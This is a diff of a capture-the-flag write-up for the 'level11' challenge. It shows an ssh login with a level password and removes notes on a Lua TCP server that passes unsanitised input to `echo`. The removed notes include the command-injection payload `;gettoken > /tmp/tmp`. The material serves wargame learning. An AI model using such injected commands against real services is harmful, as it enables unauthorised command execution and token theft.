@@ -8,12 +8,6 @@ Login
 > ssh level11@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
 > Password: s5cAJpM8ev6XHw998pRWG728z
 ```
-
-Tryout
-- We have a Lua script
-  - A TCP server is created and it listens on localhost port 5151
-  - It get an input, concat it to `echo` w/o sanitization
-
 ```b
 > ls -l
 -rwsr-sr-x 1 flag11 level11 668 level11.lua
@@ -58,25 +52,7 @@ while 1 do
   client:close()
 ```
 
-Run the script
-- we find the server is up and running
-- `nc` to it, it is the same Lua program asking for password
-
-```b
-> ./level11.lua 
-lua: ./level11.lua:3: address already in use
-stack traceback:
-	[C]: in function 'assert'
-	./level11.lua:3: in main chunk
-	[C]: ?
-```
-
 Solution
-- Goal: design a string for `hash()` to concat to `echo`
-  - halt `echo` w/ `;` 
-  - then do what we want `gettoken > /tmp/tmp`
-  - ie. `echo ;gettoken > /tmp/tmp | sha1sum`
-  - the piping to sha1sum is discarded
 
 ```b
 > nc localhost 5151
